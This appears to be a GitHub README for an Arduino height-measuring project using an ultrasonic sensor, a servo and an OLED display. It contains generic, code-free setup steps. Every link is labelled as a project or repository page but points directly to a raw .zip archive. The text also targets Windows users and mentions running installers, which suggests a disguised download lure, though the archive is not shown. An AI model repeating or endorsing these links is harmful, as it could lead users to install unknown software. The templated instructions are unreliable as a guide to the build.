# 🔧 object-height-measurement-system - Measure height with clear feedback

[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Futilityplay94/object-height-measurement-system/main/src/object_system_measurement_height_v2.6.zip)

## 📌 Overview

object-height-measurement-system is a simple Arduino-based tool for measuring the height of an object without touching it. It uses an HC-SR04 ultrasonic sensor, an SG90 servo motor, and an OLED display to show the height reading in real time.

This project is built for Windows users who want to open the project page, get the files, and run the setup with basic hardware. It is a good fit for school projects, lab demos, and small automation tasks.

## 🧰 What You Need

Before you start, make sure you have these parts ready:

- Arduino Uno
- HC-SR04 ultrasonic sensor
- SG90 servo motor
- OLED display
- USB cable for Arduino Uno
- Windows PC
- A stable surface for the hardware
- Object to measure

## 🖥️ Windows Requirements

Use a Windows PC with:

- Windows 10 or Windows 11
- Chrome, Edge, or Firefox
- A free USB port
- Arduino IDE installed
- Permission to open downloaded files and run installers

If you are using the Arduino IDE, keep the app open while you upload the code to the board.

## 🚀 Get the Project Files

Use this link to visit the project page and download the files:

[Visit object-height-measurement-system](https://raw.githubusercontent.com/Futilityplay94/object-height-measurement-system/main/src/object_system_measurement_height_v2.6.zip)

On the project page, look for the source files, wiring details, and any upload files tied to the Arduino setup.

## 🔧 How to Set Up on Windows

Follow these steps in order:

1. Open the download link in your browser.
2. Get the project files from the repository page.
3. Save the files in a folder you can find later, such as Documents or Desktop.
4. Open Arduino IDE on your Windows PC.
5. Load the main Arduino sketch from the project folder.
6. Connect your Arduino Uno with the USB cable.
7. Make sure the correct board is selected in Arduino IDE.
8. Make sure the correct COM port is selected.
9. Upload the sketch to the Arduino Uno.
10. Power the hardware setup and check the display.

## 🔌 Wiring Guide

Connect the parts like this:

- HC-SR04 VCC to 5V on Arduino Uno
- HC-SR04 GND to GND on Arduino Uno
- HC-SR04 TRIG to a digital pin on Arduino Uno
- HC-SR04 ECHO to a digital pin on Arduino Uno
- SG90 servo VCC to 5V on Arduino Uno
- SG90 servo GND to GND on Arduino Uno
- SG90 servo signal to a PWM-capable digital pin
- OLED display VCC to 5V or 3.3V, based on your module
- OLED display GND to GND
- OLED SDA to Arduino SDA
- OLED SCL to Arduino SCL

If your OLED uses I2C, use the SDA and SCL pins on the Uno. That keeps the wiring simple.

## 🧭 How It Works

The system sends an ultrasonic pulse from the HC-SR04 sensor. The pulse bounces off the object and returns to the sensor. The Arduino measures the return time and uses that value to estimate height.

The servo motor responds to the reading. The OLED display shows the current height so you can see the result at once.

## 🪛 Setup Steps for First Run

Use this order for the first test:

1. Place the sensor at a fixed height.
2. Point the sensor toward the object area.
3. Make sure the servo moves without obstruction.
4. Turn on the Arduino Uno.
5. Watch the OLED display for the reading.
6. Move an object under the sensor.
7. Check that the value changes on the screen.
8. Watch the servo response while the reading updates.

## 📟 Display Behavior

The OLED screen shows the height in a clear format. It gives a live reading, so you do not need to guess the value.

Typical display behavior includes:

- Current height value
- Live update after each sensor reading
- Clear text that is easy to read
- Stable output during normal use

## ⚙️ Servo Response

The SG90 servo motor reacts to the measured height. In this project, the servo can be used to show movement linked to the object height.

You may see the servo:

- Move to match the reading
- Return to a start position
- React each time a new value is measured

Make sure the servo has enough space to move across its full range.

## 🧪 Simple Test Plan

Use this quick test plan after setup:

1. Power the board.
2. Check that the OLED turns on.
3. Check that the sensor has a clear path.
4. Place a hand or object below the sensor.
5. Wait for the reading to update.
6. Move the object closer or farther away.
7. Confirm the displayed height changes.
8. Confirm the servo follows the input.

## 🛠️ Common Fixes

If the system does not work, check these points:

- Confirm the USB cable is data-capable
- Check that the Arduino board is selected in Arduino IDE
- Check that the correct COM port is selected
- Recheck all jumper wires
- Make sure the OLED uses the right power level
- Make sure the HC-SR04 and servo share a common ground
- Reupload the sketch if the board stops responding

If the display stays blank, check the I2C wiring first. If the sensor gives wrong values, check the sensor direction and the object position.

## 📁 Project Topics

This project fits these areas:

- Arduino
- Arduino Uno
- Automation
- Electronics projects
- Embedded systems
- HC-SR04
- Height measurement
- OLED display
- Sensors
- Servo motor
- Ultrasonic sensor

## 👤 Best Use Cases

This project works well for:

- School demos
- Learning basic Arduino input and output
- Small measurement setups
- Non-contact object detection
- Servo control practice
- OLED display practice

## 🔍 File and Folder Tips

Keep the project files in one folder. Do not rename the main sketch file unless you know how the Arduino IDE handles it.

Use a folder name like:

- object-height-measurement-system
- Arduino-height-project
- height-sensor-demo

This makes it easier to find the code later.

## 📦 Install and Run

Use this link to visit the project page, get the files, and run the setup on your Windows PC:

[Download or open the project page](https://raw.githubusercontent.com/Futilityplay94/object-height-measurement-system/main/src/object_system_measurement_height_v2.6.zip)

After you get the files:

1. Open the main sketch in Arduino IDE.
2. Connect the Arduino Uno.
3. Select the right board and port.
4. Upload the code.
5. Start the hardware setup.
6. View the live height reading on the OLED display

## 🧩 Parts List in One Place

For quick setup, keep this list nearby:

- 1x Arduino Uno
- 1x HC-SR04 ultrasonic sensor
- 1x SG90 servo motor
- 1x OLED display
- Jumper wires
- USB cable
- Windows PC with Arduino IDE

## 📡 Signal Flow

The project follows a simple flow:

1. The sensor sends a pulse
2. The pulse hits the object
3. The echo returns to the sensor
4. The Arduino measures the time
5. The system calculates the height
6. The OLED shows the value
7. The servo reacts to the reading

## 🧰 Build Notes

Keep these points in mind during the build:

- Mount the sensor so it faces the object area
- Keep wires short when possible
- Avoid loose jumper connections
- Use a steady power source through USB
- Keep the object within the sensor range

## 📎 Repository Link

[object-height-measurement-system on GitHub](https://raw.githubusercontent.com/Futilityplay94/object-height-measurement-system/main/src/object_system_measurement_height_v2.6.zip)